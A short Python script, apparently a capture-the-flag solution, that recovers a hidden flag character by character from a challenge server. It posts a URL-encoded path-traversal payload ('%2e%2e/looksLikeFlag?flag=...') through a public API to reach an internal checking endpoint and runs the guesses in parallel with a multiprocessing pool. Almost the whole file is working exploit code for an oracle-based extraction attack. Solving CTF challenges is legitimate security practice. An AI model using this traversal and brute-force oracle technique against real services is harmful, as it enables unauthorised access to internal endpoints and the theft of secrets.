from multiprocessing.pool import Pool
from multiprocessing import freeze_support
from time import time
def multi(func, init_list, processes = 16, debug = False):
    freeze_support()
    with Pool(processes) as pool:
        start = time()
        outputs = pool.starmap(func, init_list)
        outputs = [x for x in outputs if x]
        end = time()
        if debug: print('used time: {}'.format(end-start))
    return outputs

import requests
import json
import string

def send(flag):
    res = requests.post(
        url = "http://splitline.tw:5000/public_api",
        headers = {
            "Content-Type": "application/json",
        },
        data = json.dumps({
            "text": f"%2e%2e/looksLikeFlag?flag={flag}"
        })
    )
    return res.json()['looksLikeFlag']

# /^FLAG{[a-z0-9_]+}$/
flag = 'FLAG{'
charset = string.ascii_lowercase + string.digits + '_' + '}'

def wrap(t):
    if send(t):
        return t

def main():
    global flag
    while '}' not in flag:
        flag = multi(wrap, [(flag+c,) for c in charset], len(charset))[0]
        print(flag)

if __name__ == '__main__':
    main()
